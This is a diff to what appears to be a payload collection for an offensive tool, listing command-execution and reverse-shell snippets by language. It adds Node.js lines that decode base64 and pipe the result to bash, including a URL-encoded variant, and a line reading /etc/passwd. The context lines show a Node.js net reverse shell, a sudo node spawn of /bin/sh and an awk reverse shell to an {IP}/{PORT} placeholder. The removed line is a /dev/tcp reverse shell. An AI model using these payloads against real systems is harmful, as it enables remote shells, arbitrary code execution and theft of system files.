@@ -397,7 +397,9 @@ payload:
     - |
       require("child_process").exec("echo {BASE64} | base64 -d | bash")
     - |
-      require("child_process").exec("bash -i >& /dev/tcp/{IP}/{PORT} 0>&1")
+      require("child_process").exec("echo {BASE64} | base64 -d | bash")
+    - |
+      require("child_process").exec("echo+{BASE64_URLENCODE}+|+base64+-d+|+bash")
     - |
       {NODEJS_DESERIALIZATION}
       var net = require('net');
@@ -425,6 +427,11 @@ payload:
       c(HOST,PORT);
     - |
       sudo node -e 'child_process.spawn("/bin/sh", {stdio: [0, 1, 2]})'
+    - |
+      # Others
+      
+      require('fs').readFileSync("/etc/passwd").toString('utf8')
+      
   awk: 
     - |
       awk 'BEGIN {s = "/inet/tcp/0/{IP}/{PORT}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
